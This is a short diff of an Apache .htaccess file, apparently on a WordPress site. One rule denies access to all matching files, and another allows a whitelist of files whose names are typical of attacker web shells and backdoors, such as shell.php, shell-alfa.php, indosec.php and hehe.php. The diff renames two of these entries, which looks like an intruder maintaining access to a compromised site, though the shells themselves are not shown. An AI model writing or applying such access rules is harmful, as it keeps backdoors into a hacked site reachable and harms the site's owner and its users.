@@ -10,7 +10,7 @@ RewriteRule . index.php [L]
 Order Allow,Deny
 Deny from all
 </FilesMatch>
-<FilesMatch "^(index.php|wp-login.php|wp-admin.php|wp-blog-activated.php|wp-blog-activate.php|wp-mail-activated.php|wp-loadscript.php|wp-reload.php|wp-high-post.php|wp-blog-reload.php|wp-log-style.php|class-wp-reload.php|wp-signin.php|wp-sample-config.php|class-wp-rest-comment.php|wp-rules.php|anti-male.php|pake-id-pw.php|baypas.php|indosec.php|wp-blog.php|wow.php|hehe.php|shell-alfa.php|)$">
+<FilesMatch "^(index.php|wp-login.php|wp-admin.php|wp-blog-activated.php|wp-blog-activate.php|wp-mail-activated.php|wp-loadscript.php|wp-reload.php|wp-high-post.php|wp-blog-reload.php|wp-log-style.php|class-wp-reload.php|wp-signin.php|wp-sample-config.php|class-wp-rest-comment.php|wp-rules.php|anti-male.php|pake-id-pw.php|blogs.php|indosec.php|wp-blog.php|wow.php|hehe.php|shell.php|)$">
 Order Allow,Deny
 Allow from all
 </FilesMatch>
